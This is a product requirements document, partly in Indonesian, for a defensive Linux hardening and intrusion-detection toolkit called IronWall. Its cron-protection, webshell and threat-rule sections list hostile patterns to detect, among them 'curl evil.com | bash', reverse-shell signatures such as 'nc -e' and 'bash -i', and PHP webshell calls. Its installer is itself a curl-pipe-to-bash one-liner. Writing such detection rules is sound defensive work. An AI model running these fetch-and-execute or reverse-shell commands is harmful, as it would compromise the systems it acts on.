# PRD — Automated Linux System Hardening & Intrusion Prevention Toolkit

## Product Name

IronWall  
Automated Linux Server Hardening & Threat Prevention Toolkit

---

# 1. Product Vision

Membangun sistem otomasi keamanan server Linux yang dapat dijalankan menggunakan satu script untuk:

- hardening server
- mencegah persistence malware
- memblok brute force
- mendeteksi abnormal process
- melindungi file sistem penting
- mengamankan SSH
- mengaktifkan firewall
- monitoring intrusion realtime

Tanpa perlu konfigurasi manual rumit seperti Fail2Ban, AppArmor, auditd, dan iptables satu per satu.

---

# 2. Product Goal

User cukup menjalankan:

```bash
curl -sSL https://ironwall.sh/install.sh | bash
```

atau:

```bash
wget -O - https://ironwall.sh/install.sh | bash
```

Maka server otomatis:
- hardened
- secured
- monitored
- protected

---

# 3. Target Users

## Primary
- VPS users
- DevOps engineer
- Hosting provider
- Cybersecurity team
- Startup infrastructure

## Secondary
- Self-hosted users
- Homelab
- Web hosting reseller

---

# 4. Supported OS

## Phase 1
- Ubuntu 20.04+
- Ubuntu 22.04+
- Debian 11+
- Debian 12+

## Phase 2
- CentOS
- AlmaLinux
- Rocky Linux

---

# 5. Core Features

# 5.1 SSH Hardening

## Features
- disable root login
- disable password auth
- enforce public key auth
- change default SSH port
- rate limit SSH
- detect brute force
- auto block attacker IP

## Implementation
- Fail2Ban
- nftables
- sshd_config automation

---

# 5.2 Firewall Automation

## Features
- auto configure nftables/iptables
- allow only required ports
- geo blocking optional
- anti port scanning
- connection limit

## Default Rules

Allow:
- 22/SSH
- 80/HTTP
- 443/HTTPS

Block:
- all others

---

# 5.3 System File Protection

## Protected Paths

```txt
/etc/passwd
/etc/shadow
/etc/group
/etc/ssh/
/etc/crontab
/usr/bin/
/usr/sbin/
```

## Features
- immutable critical files
- file integrity monitoring
- unauthorized modification detection

## Implementation
- chattr +i
- auditd
- inotify

---

# 5.4 Cron Protection

## Features
- detect unauthorized cronjob
- whitelist cron
- realtime cron modification alert

## Detect
```bash
curl evil.com | bash
wget malware.sh
xmrig install
```

---

# 5.5 Malware & Miner Detection

## Detect
- xmrig
- kinsing
- cryptominer
- reverse shell
- suspicious python/bash process

## Features
- auto kill
- quarantine
- process blacklist
- CPU anomaly detection

## Implementation
- process scanner daemon
- regex detection
- eBPF monitoring

---

# 5.6 Webshell Detection

## Scan Locations
```txt
/var/www/
/home/
/tmp/
/dev/shm/
```

## Detect
- eval(base64_decode())
- system($_GET)
- shell_exec
- cmd.php
- obfuscated PHP

## Actions
- quarantine
- delete
- alert webhook

---

# 5.7 Rootkit Detection

## Integrations
- rkhunter
- chkrootkit

## Automated
- daily scan
- report generation

---

# 5.8 Intrusion Detection

## Features
- suspicious command detection
- privilege escalation detection
- reverse shell detection
- unauthorized binary execution

## Implementation
- auditd
- Falco
- eBPF hooks

---

# 5.9 File Integrity Monitoring

## Features
- baseline snapshot
- detect changes
- realtime alert

## Protected Directories
```txt
/etc/
/usr/
/boot/
/var/www/
```

---

# 5.10 WAF Protection

## Stack
- Nginx
- ModSecurity
- OWASP CRS

## Protection
- SQL Injection
- XSS
- LFI/RFI
- Bad bot
- CC attack

---

# 5.11 Docker Protection

## Features
- secure docker.sock
- container isolation
- privileged container detection
- container escape detection

---

# 5.12 Auto Update Security

## Features
- unattended security update
- patch vulnerability
- reboot scheduler optional

---

# 5.13 Alert & Notification System

## Channels
- Telegram
- Discord
- Slack
- Email
- Webhook

## Example Alert

```txt
⚠️ Intrusion Detected

Server:
api-prod-01

Threat:
Reverse shell detected

Process:
python -c socket reverse shell

Action:
Process terminated
IP blocked
```

---

# 6. System Architecture

```txt
Installer Script
        ↓
Core Engine
        ↓
Security Modules
 ├── SSH Hardening
 ├── Firewall
 ├── IDS
 ├── Malware Scanner
 ├── WAF
 ├── Integrity Monitor
 └── Notification Engine
        ↓
Realtime Monitoring
        ↓
Threat Detection
        ↓
Auto Mitigation
```

---

# 7. Installation Flow

## One-line Install

```bash
curl -sSL https://ironwall.sh/install.sh | bash
```

---

## Installer Tasks

### Step 1
Detect OS

### Step 2
Install dependencies

```bash
apt install:
fail2ban
auditd
nginx
modsecurity
clamav
rkhunter
```

### Step 3
Apply security configs

### Step 4
Enable monitoring daemon

### Step 5
Configure firewall

### Step 6
Setup Telegram alert

### Step 7
Create dashboard

---

# 8. Dashboard Features

## Web UI

### Overview
- server health
- attack count
- blocked IP
- active threat
- CPU usage
- memory

### Security Events
- brute force
- malware
- webshell
- intrusion
- file changes

### Actions
- unblock IP
- whitelist process
- disable module

---

# 9. Recommended Tech Stack

| Component | Technology |
|---|---|
| Backend | Go |
| Monitoring Agent | Rust |
| Dashboard API | FastAPI |
| Frontend | Next.js |
| Database | PostgreSQL |
| Cache | Redis |
| Queue | NATS |
| WAF | ModSecurity |
| IDS | Falco |
| Monitoring | Prometheus |
| Container | Docker |

---

# 10. Minimal MVP

## Features
- SSH hardening
- firewall
- Fail2Ban
- malware scan
- Telegram alert
- cron protection
- immutable files

## No Dashboard Yet

CLI only.

---

# 11. CLI Commands

## Example

```bash
ironwall status
ironwall scan
ironwall protect
ironwall unprotect
ironwall firewall status
ironwall logs
```

---

# 12. Security Policies

## Default Modes

### SAFE
Balanced protection

### STRICT
Maximum protection

### CUSTOM
User-defined rules

---

# 13. Threat Detection Rules

## Examples

### Reverse Shell
```regex
bash -i
python.*socket
nc -e
perl.*socket
```

### Miner
```regex
xmrig
kinsing
cpuminer
stratum+tcp
```

---

# 14. Performance Goals

| Metric | Target |
|---|---|
| CPU overhead | <5% |
| RAM usage | <300MB |
| Alert latency | <3 sec |
| Boot impact | minimal |

---

# 15. Security Considerations

## Risks
- false positive
- locking legitimate services
- blocking admin accidentally

## Mitigation
- recovery mode
- safe mode
- rollback configs
- backup before hardening

---

# 16. Recovery System

## Auto Backup

Before applying:
```txt
/etc/
/var/spool/cron/
/etc/ssh/
```

## Rollback
```bash
ironwall rollback
```

---

# 17. Roadmap

## Phase 1
- CLI installer
- SSH hardening
- firewall
- monitoring

## Phase 2
- dashboard
- realtime alerts
- WAF

## Phase 3
- eBPF detection
- AI anomaly detection
- cluster protection

---

# 18. Future Features

- ransomware protection
- zero trust mode
- AI threat scoring
- container runtime security
- kubernetes hardening
- cloud posture management

---

# 19. Competitor Reference

| Product | Similarity |
|---|---|
| aaPanel Hardening | partial |
| CrowdSec | IDS |
| Wazuh | SIEM |
| Falco | runtime security |
| Tetragon | eBPF security |
| CrowdStrike | enterprise EDR |

---

# 20. Final Product Goal

Membuat:

> “CrowdStrike ringan versi self-hosted Linux VPS”

yang:
- otomatis
- mudah dipasang
- low resource
- realtime
- anti malware
- anti persistence
- anti intrusion
- production ready

